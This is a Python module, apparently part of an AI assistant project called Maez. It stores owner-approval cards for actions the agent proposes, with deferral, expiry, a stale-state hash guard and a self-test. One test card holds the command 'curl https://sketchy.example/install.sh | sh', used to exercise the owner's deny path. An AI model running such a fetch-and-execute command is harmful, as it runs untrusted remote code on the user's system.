r"""
Maez Pending Cards Store — Session 11z Part 2, Step 9a.

The pending-cards store is the persistent queue of outstanding
approval cards. It lives ABOVE the conversation stream so the owner can
pivot mid-chat, ask Maez something else, come back an hour later,
and the card is still there waiting — with its original reasoning,
its audit verdict, and a fingerprint of the world as it was at
creation time so stale cards invalidate themselves instead of
running against a changed environment.

Design notes
────────────

1. Append-mostly. Cards are never deleted, only transitioned. The
   store is an audit-visible record of every action Maez proposed,
   whether it ran, whether the owner approved it, and why.

2. Status machine:

       open ──────┬───► approved ──► running ──► done
                  │                           └─► failed
                  ├───► denied
                  ├───► deferred ──► open (on reminder)
                  └───► expired  (state hash invalidation OR
                                  no reply for a very long time)

   The only legal in-place mutations are status transitions and
   defer counter increments. Everything else is set once at creation.

3. State hash is a precondition fingerprint. The caller provides an
   arbitrary dict at create time describing "things I care about in
   the world right now." The store hashes it. On approval, the
   caller provides a fresh version of the same dict, the store
   hashes it, and if the hashes differ the card self-expires and
   refuses to run. This catches the race where the owner says "approve
   in an hour" and something material changes in between.

4. Channel-agnostic. The card carries `channel` and
   `channel_message_id` but no channel-specific logic. A Telegram
   text renderer fills these in; a future voice renderer would fill
   them in differently; the store neither knows nor cares.

5. Separate from audit_log.db. The audit log is the immune-system
   memory of every audit call ever made (including ones that never
   became cards because they were Lane 0 or got deny'd outright).
   The pending cards store is the subset that became actual
   cards shown to the owner. Each card row has `audit_request_id`
   pointing to its audit-log ancestor for correlation.
"""

from __future__ import annotations

import hashlib
import json
import os
import secrets
import sqlite3
import time
from dataclasses import dataclass, field, asdict
from enum import Enum
from pathlib import Path
from typing import Any, Optional


DEFAULT_DB_PATH = Path(os.environ.get(
    "MAEZ_PENDING_CARDS_PATH",
    str(Path(__file__).resolve().parent.parent / "memory" / "pending_cards.db"),
))


# ------------------------------------------------------------------ #
#  Status enum                                                         #
# ------------------------------------------------------------------ #

class CardStatus(str, Enum):
    OPEN      = "open"
    DEFERRED  = "deferred"
    APPROVED  = "approved"
    DENIED    = "denied"
    EXPIRED   = "expired"
    RUNNING   = "running"
    DONE      = "done"
    FAILED    = "failed"


# Statuses where the card is still awaiting the owner's decision
AWAITING_STATUSES = frozenset({CardStatus.OPEN.value, CardStatus.DEFERRED.value})
# Statuses where execution has been authorized
EXECUTING_STATUSES = frozenset({CardStatus.APPROVED.value, CardStatus.RUNNING.value})
# Terminal statuses — no more transitions allowed
TERMINAL_STATUSES = frozenset({
    CardStatus.DENIED.value,
    CardStatus.EXPIRED.value,
    CardStatus.DONE.value,
    CardStatus.FAILED.value,
})


# ------------------------------------------------------------------ #
#  Schema                                                              #
# ------------------------------------------------------------------ #

_SCHEMA = """
CREATE TABLE IF NOT EXISTS pending_cards (
    id                      INTEGER PRIMARY KEY AUTOINCREMENT,
    request_id              TEXT    NOT NULL UNIQUE,
    created_at              REAL    NOT NULL,
    updated_at              REAL    NOT NULL,
    status                  TEXT    NOT NULL,

    action                  TEXT    NOT NULL,
    params_json             TEXT    NOT NULL,
    reason                  TEXT,

    audit_decision          TEXT,
    audit_confidence        REAL,
    audit_reasoning         TEXT,
    audit_concerns_json     TEXT,
    audit_mitigations_json  TEXT,
    audit_summary           TEXT,
    audit_answers_json      TEXT,
    audit_request_id        TEXT,

    intent_category         TEXT,
    lane                    TEXT,

    state_hash              TEXT    NOT NULL,
    state_fields_json       TEXT,

    channel                 TEXT    NOT NULL,
    channel_message_id      TEXT,
    chat_id                 TEXT,
    user_id                 TEXT,

    remind_at               REAL,
    defer_reason            TEXT,
    defer_count             INTEGER NOT NULL DEFAULT 0,

    resolved_at             REAL,
    resolved_by_user_id     TEXT,
    resolved_via            TEXT,
    resolution_notes        TEXT,

    executed_at             REAL,
    execution_success       INTEGER,
    execution_output        TEXT,
    execution_error         TEXT
);

CREATE INDEX IF NOT EXISTS idx_cards_status       ON pending_cards(status);
CREATE INDEX IF NOT EXISTS idx_cards_user         ON pending_cards(user_id);
CREATE INDEX IF NOT EXISTS idx_cards_remind_at    ON pending_cards(remind_at);
CREATE INDEX IF NOT EXISTS idx_cards_channel_msg  ON pending_cards(channel, channel_message_id);
"""


# ------------------------------------------------------------------ #
#  State hash                                                          #
# ------------------------------------------------------------------ #

def compute_state_hash(state_fields: dict | None) -> str:
    """Stable hash of a dict of precondition fields.

    The caller chooses what to include — cwd, target-file mtime, a
    systemd unit state, disk free bucket, whatever fits the action.
    The store just fingerprints it and compares later.
    """
    if not state_fields:
        return "empty"
    canonical = json.dumps(state_fields, sort_keys=True, default=str)
    return hashlib.sha256(canonical.encode("utf-8")).hexdigest()[:32]


# ------------------------------------------------------------------ #
#  CardRecord                                                          #
# ------------------------------------------------------------------ #

@dataclass
class CardRecord:
    request_id: str
    created_at: float
    updated_at: float
    status: str

    action: str
    params: dict
    reason: Optional[str] = None

    audit_decision: Optional[str] = None
    audit_confidence: float = 0.0
    audit_reasoning: str = ""
    audit_concerns: list = field(default_factory=list)
    audit_mitigations: list = field(default_factory=list)
    audit_summary: str = ""
    audit_answers: dict = field(default_factory=dict)
    audit_request_id: Optional[str] = None

    intent_category: Optional[str] = None
    lane: Optional[str] = None

    state_hash: str = "empty"
    state_fields: Optional[dict] = None

    channel: str = "telegram_text"
    channel_message_id: Optional[str] = None
    chat_id: Optional[str] = None
    user_id: Optional[str] = None

    remind_at: Optional[float] = None
    defer_reason: Optional[str] = None
    defer_count: int = 0

    resolved_at: Optional[float] = None
    resolved_by_user_id: Optional[str] = None
    resolved_via: Optional[str] = None
    resolution_notes: Optional[str] = None

    executed_at: Optional[float] = None
    execution_success: Optional[bool] = None
    execution_output: Optional[str] = None
    execution_error: Optional[str] = None

    def to_dict(self) -> dict:
        return asdict(self)

    def is_awaiting(self) -> bool:
        return self.status in AWAITING_STATUSES

    def is_terminal(self) -> bool:
        return self.status in TERMINAL_STATUSES


def _row_to_record(row: sqlite3.Row) -> CardRecord:
    def _loads(s: Optional[str], default):
        if not s:
            return default
        try:
            return json.loads(s)
        except Exception:
            return default

    return CardRecord(
        request_id=row["request_id"],
        created_at=row["created_at"],
        updated_at=row["updated_at"],
        status=row["status"],
        action=row["action"],
        params=_loads(row["params_json"], {}),
        reason=row["reason"],
        audit_decision=row["audit_decision"],
        audit_confidence=row["audit_confidence"] or 0.0,
        audit_reasoning=row["audit_reasoning"] or "",
        audit_concerns=_loads(row["audit_concerns_json"], []),
        audit_mitigations=_loads(row["audit_mitigations_json"], []),
        audit_summary=row["audit_summary"] or "",
        audit_answers=_loads(row["audit_answers_json"], {}),
        audit_request_id=row["audit_request_id"],
        intent_category=row["intent_category"],
        lane=row["lane"],
        state_hash=row["state_hash"],
        state_fields=_loads(row["state_fields_json"], None),
        channel=row["channel"],
        channel_message_id=row["channel_message_id"],
        chat_id=row["chat_id"],
        user_id=row["user_id"],
        remind_at=row["remind_at"],
        defer_reason=row["defer_reason"],
        defer_count=row["defer_count"] or 0,
        resolved_at=row["resolved_at"],
        resolved_by_user_id=row["resolved_by_user_id"],
        resolved_via=row["resolved_via"],
        resolution_notes=row["resolution_notes"],
        executed_at=row["executed_at"],
        execution_success=(bool(row["execution_success"]) if row["execution_success"] is not None else None),
        execution_output=row["execution_output"],
        execution_error=row["execution_error"],
    )


# ------------------------------------------------------------------ #
#  PendingCardStore                                                    #
# ------------------------------------------------------------------ #

class CardStoreError(RuntimeError):
    pass


class PendingCardStore:
    """SQLite-backed store of outstanding approval cards."""

    def __init__(self, db_path: Path | str | None = None):
        self.db_path = Path(db_path) if db_path else DEFAULT_DB_PATH
        self.db_path.parent.mkdir(parents=True, exist_ok=True)
        with sqlite3.connect(self.db_path) as conn:
            conn.executescript(_SCHEMA)

    def _conn(self) -> sqlite3.Connection:
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        return conn

    # -------------------------------------------------------------- #
    #  Create                                                         #
    # -------------------------------------------------------------- #

    def create_card(
        self,
        *,
        action: str,
        params: dict,
        reason: Optional[str] = None,
        audit_verdict: Any = None,
        audit_request_id: Optional[str] = None,
        classification: Any = None,
        state_fields: Optional[dict] = None,
        channel: str = "telegram_text",
        chat_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ) -> CardRecord:
        request_id = secrets.token_hex(12)
        now = time.time()
        state_hash = compute_state_hash(state_fields)

        # Pull classification
        if classification is None:
            intent_category = None
            lane = None
        elif isinstance(classification, dict):
            ic = classification.get("intent_category")
            intent_category = getattr(ic, "value", str(ic)) if ic is not None else None
            lane = classification.get("lane")
        else:
            ic = getattr(classification, "intent_category", None)
            intent_category = getattr(ic, "value", str(ic)) if ic is not None else None
            lane = getattr(classification, "lane", None)
        if lane is not None:
            lane = str(lane)

        # Pull verdict
        if audit_verdict is None:
            audit_decision = None
            audit_confidence = 0.0
            audit_reasoning = ""
            concerns = []
            mitigations = []
            summary = ""
            answers = {}
        else:
            dec_val = getattr(audit_verdict, "decision", None)
            audit_decision = getattr(dec_val, "value", str(dec_val)) if dec_val is not None else None
            audit_confidence = float(getattr(audit_verdict, "confidence", 0.0) or 0.0)
            audit_reasoning = str(getattr(audit_verdict, "reasoning", "") or "")
            concerns = list(getattr(audit_verdict, "concerns", []) or [])
            mitigations = list(getattr(audit_verdict, "mitigations", []) or [])
            summary = str(getattr(audit_verdict, "summary", "") or "")
            answers = dict(getattr(audit_verdict, "answers", {}) or {})

        with self._conn() as conn:
            conn.execute(
                """
                INSERT INTO pending_cards (
                    request_id, created_at, updated_at, status,
                    action, params_json, reason,
                    audit_decision, audit_confidence, audit_reasoning,
                    audit_concerns_json, audit_mitigations_json,
                    audit_summary, audit_answers_json, audit_request_id,
                    intent_category, lane,
                    state_hash, state_fields_json,
                    channel, channel_message_id, chat_id, user_id,
                    remind_at, defer_reason, defer_count
                ) VALUES (
                    ?, ?, ?, ?,
                    ?, ?, ?,
                    ?, ?, ?,
                    ?, ?,
                    ?, ?, ?,
                    ?, ?,
                    ?, ?,
                    ?, NULL, ?, ?,
                    NULL, NULL, 0
                )
                """,
                (
                    request_id, now, now, CardStatus.OPEN.value,
                    action, json.dumps(params or {}), reason,
                    audit_decision, audit_confidence, audit_reasoning,
                    json.dumps(concerns), json.dumps(mitigations),
                    summary, json.dumps(answers), audit_request_id,
                    intent_category, lane,
                    state_hash, json.dumps(state_fields) if state_fields else None,
                    channel, chat_id, user_id,
                ),
            )
        return self.get(request_id)  # type: ignore[return-value]

    # -------------------------------------------------------------- #
    #  Read                                                           #
    # -------------------------------------------------------------- #

    def get(self, request_id: str) -> Optional[CardRecord]:
        with self._conn() as conn:
            row = conn.execute(
                "SELECT * FROM pending_cards WHERE request_id = ?",
                (request_id,),
            ).fetchone()
        return _row_to_record(row) if row else None

    def get_open_for_user(self, user_id: str) -> list[CardRecord]:
        with self._conn() as conn:
            rows = conn.execute(
                """
                SELECT * FROM pending_cards
                WHERE user_id = ? AND status IN (?, ?)
                ORDER BY created_at ASC
                """,
                (user_id, CardStatus.OPEN.value, CardStatus.DEFERRED.value),
            ).fetchall()
        return [_row_to_record(r) for r in rows]

    def get_open_for_channel(self, channel: str, chat_id: Optional[str] = None) -> list[CardRecord]:
        with self._conn() as conn:
            if chat_id is None:
                rows = conn.execute(
                    """
                    SELECT * FROM pending_cards
                    WHERE channel = ? AND status IN (?, ?)
                    ORDER BY created_at ASC
                    """,
                    (channel, CardStatus.OPEN.value, CardStatus.DEFERRED.value),
                ).fetchall()
            else:
                rows = conn.execute(
                    """
                    SELECT * FROM pending_cards
                    WHERE channel = ? AND chat_id = ? AND status IN (?, ?)
                    ORDER BY created_at ASC
                    """,
                    (channel, chat_id, CardStatus.OPEN.value, CardStatus.DEFERRED.value),
                ).fetchall()
        return [_row_to_record(r) for r in rows]

    def get_by_message(self, channel: str, channel_message_id: str) -> Optional[CardRecord]:
        with self._conn() as conn:
            row = conn.execute(
                "SELECT * FROM pending_cards WHERE channel = ? AND channel_message_id = ?",
                (channel, channel_message_id),
            ).fetchone()
        return _row_to_record(row) if row else None

    def recent_activity_for_chat(
        self,
        channel: str,
        chat_id: str,
        since_seconds: float = 600.0,
        limit: int = 8,
    ) -> list[CardRecord]:
        """Return recently-resolved (or currently-open) cards in this chat,
        ordered oldest → newest. Used by telegram_voice to inject a
        'what your body just did' block into the reply context so Maez
        can answer follow-up questions grounded in real state instead of
        forgetting that a card resolved 60 seconds ago.

        Includes: open + resolved states (done, failed, denied, expired).
        Excludes: cards older than `since_seconds` to keep the block small
        and relevant. The caller is responsible for formatting.
        """
        cutoff = time.time() - since_seconds
        with self._conn() as conn:
            rows = conn.execute(
                """
                SELECT * FROM pending_cards
                WHERE channel = ? AND chat_id = ?
                  AND (
                    (resolved_at IS NOT NULL AND resolved_at >= ?)
                    OR (status = ? AND created_at >= ?)
                  )
                ORDER BY COALESCE(resolved_at, created_at) ASC
                LIMIT ?
                """,
                (
                    channel,
                    chat_id,
                    cutoff,
                    CardStatus.OPEN.value,
                    cutoff,
                    int(limit),
                ),
            ).fetchall()
        return [_row_to_record(r) for r in rows]

    def find_due_reminders(self, now: Optional[float] = None) -> list[CardRecord]:
        now = now if now is not None else time.time()
        with self._conn() as conn:
            rows = conn.execute(
                """
                SELECT * FROM pending_cards
                WHERE status = ? AND remind_at IS NOT NULL AND remind_at <= ?
                ORDER BY remind_at ASC
                """,
                (CardStatus.DEFERRED.value, now),
            ).fetchall()
        return [_row_to_record(r) for r in rows]

    # -------------------------------------------------------------- #
    #  Transitions                                                    #
    # -------------------------------------------------------------- #

    def _transition(
        self,
        request_id: str,
        new_status: str,
        *,
        allow_from: set[str],
        extras: Optional[dict] = None,
    ) -> CardRecord:
        extras = extras or {}
        now = time.time()
        with self._conn() as conn:
            row = conn.execute(
                "SELECT * FROM pending_cards WHERE request_id = ?",
                (request_id,),
            ).fetchone()
            if row is None:
                raise CardStoreError(f"no such card: {request_id}")
            if row["status"] not in allow_from:
                raise CardStoreError(
                    f"cannot transition {request_id} from {row['status']} to {new_status}"
                )
            set_clauses = ["status = ?", "updated_at = ?"]
            args: list[Any] = [new_status, now]
            for k, v in extras.items():
                set_clauses.append(f"{k} = ?")
                args.append(v)
            args.append(request_id)
            conn.execute(
                f"UPDATE pending_cards SET {', '.join(set_clauses)} WHERE request_id = ?",
                args,
            )
        card = self.get(request_id)
        if card is None:
            raise CardStoreError(f"card disappeared mid-transition: {request_id}")
        return card

    def attach_channel_message(self, request_id: str, channel_message_id: str) -> CardRecord:
        """Called by the renderer after the card has been posted to its
        channel, so future reactions/replies can look the card up by
        its channel message id."""
        with self._conn() as conn:
            conn.execute(
                "UPDATE pending_cards SET channel_message_id = ?, updated_at = ? WHERE request_id = ?",
                (channel_message_id, time.time(), request_id),
            )
        return self.get(request_id)  # type: ignore[return-value]

    def defer(
        self,
        request_id: str,
        *,
        remind_at: Optional[float],
        reason: Optional[str] = None,
        user_id: Optional[str] = None,
    ) -> CardRecord:
        card = self.get(request_id)
        if card is None:
            raise CardStoreError(f"no such card: {request_id}")
        defer_count = (card.defer_count or 0) + 1
        return self._transition(
            request_id,
            CardStatus.DEFERRED.value,
            allow_from={CardStatus.OPEN.value, CardStatus.DEFERRED.value},
            extras={
                "remind_at": remind_at,
                "defer_reason": reason,
                "defer_count": defer_count,
            },
        )

    def re_open(self, request_id: str) -> CardRecord:
        """Move a deferred card back to OPEN when its reminder fires
        and is re-presented."""
        return self._transition(
            request_id,
            CardStatus.OPEN.value,
            allow_from={CardStatus.DEFERRED.value},
            extras={"remind_at": None},
        )

    def approve(
        self,
        request_id: str,
        *,
        user_id: Optional[str],
        via: str,
        notes: Optional[str] = None,
        current_state_fields: Optional[dict] = None,
    ) -> CardRecord:
        """Approve a card. If current_state_fields is provided and its
        hash differs from the card's original state_hash, the card is
        EXPIRED instead of approved — this is the stale-world guard."""
        card = self.get(request_id)
        if card is None:
            raise CardStoreError(f"no such card: {request_id}")

        if current_state_fields is not None:
            now_hash = compute_state_hash(current_state_fields)
            if now_hash != card.state_hash:
                return self._transition(
                    request_id,
                    CardStatus.EXPIRED.value,
                    allow_from={CardStatus.OPEN.value, CardStatus.DEFERRED.value},
                    extras={
                        "resolved_at": time.time(),
                        "resolved_by_user_id": user_id,
                        "resolved_via": via,
                        "resolution_notes": f"state hash changed: was {card.state_hash}, now {now_hash}",
                    },
                )

        return self._transition(
            request_id,
            CardStatus.APPROVED.value,
            allow_from={CardStatus.OPEN.value, CardStatus.DEFERRED.value},
            extras={
                "resolved_at": time.time(),
                "resolved_by_user_id": user_id,
                "resolved_via": via,
                "resolution_notes": notes,
            },
        )

    def deny(
        self,
        request_id: str,
        *,
        user_id: Optional[str],
        via: str,
        notes: Optional[str] = None,
    ) -> CardRecord:
        return self._transition(
            request_id,
            CardStatus.DENIED.value,
            allow_from={CardStatus.OPEN.value, CardStatus.DEFERRED.value},
            extras={
                "resolved_at": time.time(),
                "resolved_by_user_id": user_id,
                "resolved_via": via,
                "resolution_notes": notes,
            },
        )

    def expire(self, request_id: str, reason: str) -> CardRecord:
        return self._transition(
            request_id,
            CardStatus.EXPIRED.value,
            allow_from={CardStatus.OPEN.value, CardStatus.DEFERRED.value},
            extras={
                "resolved_at": time.time(),
                "resolved_via": "system",
                "resolution_notes": reason,
            },
        )

    def mark_running(self, request_id: str) -> CardRecord:
        return self._transition(
            request_id,
            CardStatus.RUNNING.value,
            allow_from={CardStatus.APPROVED.value},
            extras={"executed_at": time.time()},
        )

    def mark_done(self, request_id: str, output: str = "") -> CardRecord:
        return self._transition(
            request_id,
            CardStatus.DONE.value,
            allow_from={CardStatus.APPROVED.value, CardStatus.RUNNING.value},
            extras={
                "execution_success": 1,
                "execution_output": output,
            },
        )

    def mark_failed(self, request_id: str, error: str) -> CardRecord:
        return self._transition(
            request_id,
            CardStatus.FAILED.value,
            allow_from={CardStatus.APPROVED.value, CardStatus.RUNNING.value},
            extras={
                "execution_success": 0,
                "execution_error": error,
            },
        )

    # -------------------------------------------------------------- #
    #  State hash check (explicit)                                   #
    # -------------------------------------------------------------- #

    def check_state_fresh(self, request_id: str, current_state_fields: dict) -> bool:
        card = self.get(request_id)
        if card is None:
            return False
        return compute_state_hash(current_state_fields) == card.state_hash

    # -------------------------------------------------------------- #
    #  Housekeeping                                                   #
    # -------------------------------------------------------------- #

    def expire_abandoned(self, older_than_seconds: float = 86400) -> int:
        """Mark as expired any OPEN/DEFERRED card older than the cutoff.
        Called periodically by the daemon loop. Returns count expired."""
        cutoff = time.time() - older_than_seconds
        with self._conn() as conn:
            rows = conn.execute(
                """
                SELECT request_id FROM pending_cards
                WHERE status IN (?, ?) AND created_at < ?
                """,
                (CardStatus.OPEN.value, CardStatus.DEFERRED.value, cutoff),
            ).fetchall()
        for r in rows:
            try:
                self.expire(r["request_id"], reason="abandoned (age cutoff)")
            except CardStoreError:
                pass
        return len(rows)

    def stats(self) -> dict:
        with self._conn() as conn:
            total = conn.execute("SELECT COUNT(*) AS n FROM pending_cards").fetchone()["n"]
            by_status = {
                r["status"]: r["n"]
                for r in conn.execute(
                    "SELECT status, COUNT(*) AS n FROM pending_cards GROUP BY status"
                ).fetchall()
            }
            open_count = sum(by_status.get(s, 0) for s in (CardStatus.OPEN.value, CardStatus.DEFERRED.value))
        return {"total": total, "by_status": by_status, "open": open_count}


# ------------------------------------------------------------------ #
#  Self-test                                                           #
# ------------------------------------------------------------------ #

if __name__ == "__main__":
    import tempfile
    from dataclasses import dataclass as _dc

    print("=== pending_cards self-test ===\n")

    @_dc
    class _FakeVerdict:
        decision: Any
        confidence: float = 0.9
        reasoning: str = "looks fine"
        concerns: list = field(default_factory=list)
        mitigations: list = field(default_factory=list)
        summary: str = "installs cowsay"
        answers: dict = field(default_factory=dict)

    @_dc
    class _FakeDec:
        value: str

    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tf:
        db_path = Path(tf.name)
    db_path.unlink()

    store = PendingCardStore(db_path)
    print(f"  opened store: {db_path}")

    # Create a card
    state = {"cwd": "/home/rohit", "disk_free_pct_bucket": 40, "pkg_exists": False}
    card = store.create_card(
        action="run_shell",
        params={"cmd": "sudo apt install cowsay", "reason": "fun"},
        reason="fun",
        audit_verdict=_FakeVerdict(decision=_FakeDec("APPROVE_WITH_CARD")),
        audit_request_id="audit_aaa",
        classification={"intent_category": _FakeDec("SYSTEM_MODIFICATION"), "lane": "lane_2"},
        state_fields=state,
        channel="telegram_text",
        chat_id="chat_1",
        user_id="rohit",
    )
    print(f"  ✓ created card {card.request_id} status={card.status}")
    assert card.status == CardStatus.OPEN.value
    assert card.state_hash != "empty"
    original_hash = card.state_hash

    # Attach channel message id (as renderer would after posting)
    store.attach_channel_message(card.request_id, "tg_msg_42")
    card = store.get(card.request_id)
    assert card.channel_message_id == "tg_msg_42"
    print(f"  ✓ attached channel_message_id=tg_msg_42")

    # Look up by channel message
    card2 = store.get_by_message("telegram_text", "tg_msg_42")
    assert card2 and card2.request_id == card.request_id
    print(f"  ✓ lookup by (channel, message_id) works")

    # Open list for the owner
    open_cards = store.get_open_for_user("rohit")
    assert len(open_cards) == 1
    print(f"  ✓ get_open_for_user → 1 card")

    # Defer with reminder
    future = time.time() + 3600
    deferred = store.defer(card.request_id, remind_at=future, reason="wait an hour", user_id="rohit")
    assert deferred.status == CardStatus.DEFERRED.value
    assert deferred.remind_at == future
    assert deferred.defer_count == 1
    print(f"  ✓ deferred card, defer_count={deferred.defer_count}")

    # Still "awaiting"
    open_cards = store.get_open_for_user("rohit")
    assert len(open_cards) == 1
    assert open_cards[0].status == CardStatus.DEFERRED.value
    print(f"  ✓ deferred cards still appear in open list")

    # No due reminders yet
    due = store.find_due_reminders()
    assert len(due) == 0
    # Due reminder if we look in the future
    due = store.find_due_reminders(now=future + 1)
    assert len(due) == 1
    print(f"  ✓ find_due_reminders works")

    # Defer again (simulate "wait another 30 min")
    deferred = store.defer(card.request_id, remind_at=time.time() + 1800, reason="more time", user_id="rohit")
    assert deferred.defer_count == 2
    print(f"  ✓ re-deferred, defer_count={deferred.defer_count}")

    # Reopen
    reopened = store.re_open(card.request_id)
    assert reopened.status == CardStatus.OPEN.value
    assert reopened.remind_at is None
    print(f"  ✓ reopened deferred card")

    # State hash check: fresh state matches
    assert store.check_state_fresh(card.request_id, state) is True
    # State hash check: stale state doesn't
    stale_state = dict(state)
    stale_state["disk_free_pct_bucket"] = 5  # world changed
    assert store.check_state_fresh(card.request_id, stale_state) is False
    print(f"  ✓ state hash fresh/stale detection works")

    # Approve with matching state → APPROVED
    approved = store.approve(
        card.request_id,
        user_id="rohit",
        via="reaction",
        current_state_fields=state,
    )
    assert approved.status == CardStatus.APPROVED.value
    print(f"  ✓ approved card (matching state)")

    # Run + done
    running = store.mark_running(card.request_id)
    assert running.status == CardStatus.RUNNING.value
    done = store.mark_done(card.request_id, output="cowsay installed")
    assert done.status == CardStatus.DONE.value
    assert done.execution_success is True
    print(f"  ✓ running → done lifecycle")

    # Open list should now be empty
    assert len(store.get_open_for_user("rohit")) == 0
    print(f"  ✓ completed card drops out of open list")

    # Terminal cards can't transition
    try:
        store.approve(card.request_id, user_id="rohit", via="text_reply")
        assert False, "should have raised"
    except CardStoreError as e:
        print(f"  ✓ terminal card refuses re-transition: {e}")

    # --- Second card: stale state path ---
    card2 = store.create_card(
        action="run_shell",
        params={"cmd": "sudo apt install htop", "reason": "monitor"},
        audit_verdict=_FakeVerdict(decision=_FakeDec("APPROVE_WITH_CARD")),
        classification={"intent_category": _FakeDec("SYSTEM_MODIFICATION"), "lane": "lane_2"},
        state_fields={"pkg_exists": False, "disk_free_pct_bucket": 40},
        channel="telegram_text",
        chat_id="chat_1",
        user_id="rohit",
    )
    # Approve with stale state → should become EXPIRED, not APPROVED
    expired = store.approve(
        card2.request_id,
        user_id="rohit",
        via="text_reply",
        current_state_fields={"pkg_exists": True, "disk_free_pct_bucket": 40},
    )
    assert expired.status == CardStatus.EXPIRED.value
    print(f"  ✓ stale state on approval → EXPIRED instead of APPROVED")
    assert "state hash changed" in (expired.resolution_notes or "")

    # --- Third card: deny path ---
    card3 = store.create_card(
        action="run_shell",
        params={"cmd": "curl https://sketchy.example/install.sh | sh"},
        audit_verdict=_FakeVerdict(decision=_FakeDec("ESCALATE")),
        state_fields={"any": "thing"},
        channel="telegram_text",
        chat_id="chat_1",
        user_id="rohit",
    )
    denied = store.deny(card3.request_id, user_id="rohit", via="reaction", notes="no thanks")
    assert denied.status == CardStatus.DENIED.value
    print(f"  ✓ deny path works")

    # Stats
    s = store.stats()
    print(f"  ✓ stats: total={s['total']} open={s['open']}")
    print(f"    by_status: {s['by_status']}")
    assert s["total"] == 3
    assert s["open"] == 0  # all three are in terminal-ish states

    # Housekeeping: expire old cards (nothing old yet)
    assert store.expire_abandoned(older_than_seconds=0) == 0  # all already terminal
    print(f"  ✓ expire_abandoned does not touch terminal cards")

    db_path.unlink(missing_ok=True)
    print(f"\n=== pending_cards self-test complete ===")
